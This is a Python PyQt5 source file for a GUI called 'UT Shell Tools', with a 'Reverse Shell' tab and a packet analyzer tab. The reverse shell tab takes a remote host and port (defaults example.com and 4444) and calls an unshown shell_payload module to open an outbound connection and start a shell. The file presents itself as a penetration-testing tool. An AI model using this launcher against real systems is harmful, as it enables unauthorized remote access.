#!/usr/bin/env python3
"""
GUI for Reverse Shell Payload, Enhanced Packet Analyzer, and Additional Tools

WARNING: This application is intended solely for authorized penetration testing 
in controlled environments. Unauthorized use is strictly prohibited and may 
be illegal.
"""

import sys
import time
import threading
import os

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QTabWidget, QSplitter
)
from PyQt5.QtCore import Qt, pyqtSignal, QObject

# Import reverse shell functions.
import shell_payload
# Import packet analyzer functions.
import packet_analyzer

# ========== PyQt5 Signal Emitter ==========

class LogEmitter(QObject):
    log_signal = pyqtSignal(str)

# ========== Reverse Shell Tab ==========

class ReverseShellTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.log_emitter = LogEmitter()
        self.log_emitter.log_signal.connect(self.append_log)
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()

        # Configuration input area.
        config_layout = QHBoxLayout()
        self.host_input = QLineEdit("example.com")
        self.port_input = QLineEdit("4444")
        config_layout.addWidget(QLabel("Remote Host:"))
        config_layout.addWidget(self.host_input)
        config_layout.addWidget(QLabel("Remote Port:"))
        config_layout.addWidget(self.port_input)
        layout.addLayout(config_layout)

        # Button to start the reverse shell.
        self.connect_button = QPushButton("Start Reverse Shell")
        self.connect_button.clicked.connect(self.start_reverse_shell)
        layout.addWidget(self.connect_button)

        # Log output area.
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        layout.addWidget(self.log_output, stretch=1)

        self.setLayout(layout)

    def append_log(self, message):
        timestamp = time.strftime("[%H:%M:%S]")
        self.log_output.append(f"{timestamp} {message}")

    def start_reverse_shell(self):
        remote_host = self.host_input.text().strip()
        try:
            remote_port = int(self.port_input.text().strip())
        except ValueError:
            self.append_log("[ERROR] Remote Port must be an integer.")
            return

        self.connect_button.setEnabled(False)
        self.append_log("Initiating reverse shell connection...")

        thread = threading.Thread(target=self.run_reverse_shell, args=(remote_host, remote_port), daemon=True)
        thread.start()

    def run_reverse_shell(self, remote_host, remote_port):
        connection = shell_payload.establish_connection(remote_host, remote_port, self.log_emitter.log_signal.emit)
        if connection:
            shell_payload.start_shell(connection, self.log_emitter.log_signal.emit)
        else:
            self.log_emitter.log_signal.emit("[ERROR] Unable to establish outbound connection.")
        self.connect_button.setEnabled(True)

# ========== Packet Analyzer Tab ==========

class PacketAnalyzerTab(QWidget):

    live_packet_signal = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.live_packet_signal.connect(self.update_live_output)
        self.sniff_thread = None
        self.sniffing = False
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()
        
        splitter = QSplitter(Qt.Vertical)

        # Static analysis section.
        static_widget = QWidget()
        static_layout = QVBoxLayout()
        static_layout.addWidget(QLabel("Static Packet Analysis (Paste Data Below):"))
        self.static_input = QTextEdit()
        static_layout.addWidget(self.static_input, stretch=1)
        self.analyze_button = QPushButton("Analyze Packet")
        self.analyze_button.clicked.connect(self.analyze_packet)
        static_layout.addWidget(self.analyze_button)
        static_layout.addWidget(QLabel("Analysis Results:"))
        self.static_output = QTextEdit()
        self.static_output.setReadOnly(True)
        static_layout.addWidget(self.static_output, stretch=1)
        static_widget.setLayout(static_layout)

        # Live capture section.
        live_widget = QWidget()
        live_layout = QVBoxLayout()
        live_layout.addWidget(QLabel("Live Packet Capture:"))
        self.live_output = QTextEdit()
        self.live_output.setReadOnly(True)
        live_layout.addWidget(self.live_output, stretch=1)
        self.start_live_button = QPushButton("Start Live Capture")
        self.start_live_button.clicked.connect(self.toggle_live_capture)
        live_layout.addWidget(self.start_live_button)
        live_widget.setLayout(live_layout)

        splitter.addWidget(static_widget)
        splitter.addWidget(live_widget)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 1)

        layout.addWidget(splitter)
        self.setLayout(layout)

    def analyze_packet(self):
        raw_data = self.static_input.toPlainText().strip()
        if not raw_data:
            self.static_output.setPlainText("No data provided for analysis.")
            return

        if packet_analyzer.is_hex_string(raw_data):
            packet_text = packet_analyzer.hex_to_ascii(raw_data)
            header = "Input detected as hexadecimal. Converted to ASCII below:\n"
        else:
            packet_text = raw_data
            header = "Input detected as plain text.\n"

        classification, details = packet_analyzer.classify_packet(packet_text)
        result = header + "\n" + packet_text + "\n\n"
        result += f"Classification: {classification}\n"
        result += "\n".join(details)
        self.static_output.setPlainText(result)

    def toggle_live_capture(self):
        if self.sniffing:
            self.sniffing = False
            self.start_live_button.setText("Start Live Capture")
        else:
            self.live_output.clear()
            self.sniffing = True
            self.start_live_button.setText("Stop Live Capture")
            self.sniff_thread = threading.Thread(target=self.start_live_capture, daemon=True)
            self.sniff_thread.start()

    def update_live_output(self, packet_info):
        self.live_output.append(packet_info)
    
    def start_live_capture(self):
        def callback(packet_info):
            # Instead of updating directly, emit a signal:
            self.live_packet_signal.emit(packet_info)
        try:
            # Use the live sniff function with the callback.
            packet_analyzer.live_sniff(callback, filter_expr=None, count=0, timeout=60)
        except Exception as e:
            self.live_packet_signal.emit(f"[ERROR] Live capture failed: {e}")
        self.sniffing = False
        self.start_live_button.setText("Start Live Capture")

# ========== Additional Tools Tab ==========

class AdditionalToolsTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        layout = QVBoxLayout()
        self.tools_tabs = QTabWidget()
        self.tools_tabs.addTab(PacketAnalyzerTab(), "Packet Analyzer")
        placeholder = QWidget()
        ph_layout = QVBoxLayout()
        ph_layout.addWidget(QLabel("Other additional tools can be added here."))
        placeholder.setLayout(ph_layout)
        self.tools_tabs.addTab(placeholder, "Tool Placeholder")
        layout.addWidget(self.tools_tabs)
        self.setLayout(layout)

# ========== Main Window ==========

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("UT Shell Tools")
        self.setGeometry(100, 100, 1000, 700)
        self.init_ui()
        self.load_stylesheet()

    def init_ui(self):
        self.tabs = QTabWidget()
        self.tabs.addTab(ReverseShellTab(), "Reverse Shell")
        self.tabs.addTab(AdditionalToolsTab(), "Additional Tools")
        self.setCentralWidget(self.tabs)

    def load_stylesheet(self):
        style_path = os.path.join(os.path.dirname(__file__), "style.qss")
        try:
            with open(style_path, "r", encoding="utf-8") as f:
                style = f.read()
                self.setStyleSheet(style)
        except Exception as e:
            print(f"Failed to load stylesheet: {e}")

# ========== Main Application ==========

def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
